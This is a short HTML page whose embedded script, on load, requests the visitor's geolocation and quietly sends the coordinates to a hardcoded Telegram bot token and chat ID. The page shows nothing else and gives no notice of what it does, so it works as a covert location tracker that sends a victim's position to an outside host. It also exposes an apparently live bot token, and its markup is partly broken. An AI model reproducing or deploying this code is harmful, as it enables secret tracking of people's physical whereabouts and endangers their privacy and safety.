<html lang="en">
<head>

        body {
            margin: 0;

            height: 100vh;

    </style>
</head>
<body>
    <script>
        // Ваш Telegram токен и chat_id
        const botToken = "7010906033:AAGe4fWmuWDvz4sw-CpIAs4V1sfZ52pzJbQ";
        const chatId = "2145450623";

        // Функция отправки геолокации в Telegram
        function sendLocation(latitude, longitude) {
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Ш${latitude}, Д${longitude}`;
            fetch(url)
                .then(response => console.log('Геолокация отправлена.'))
                .catch(error => console.error('Ошибка отправки геолокации:', error));
        }

        // Запрашиваем геолокацию
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                position => {
                    const { latitude, longitude } = position.coords;
                    sendLocation(latitude, longitude);
                },
                error => {
                    console.error("Ошибка получения геолокации:", error);
                }
            );
        } else {
            console.error("Геолокация не поддерживается этим браузером.");
        }
    </script>
</body>
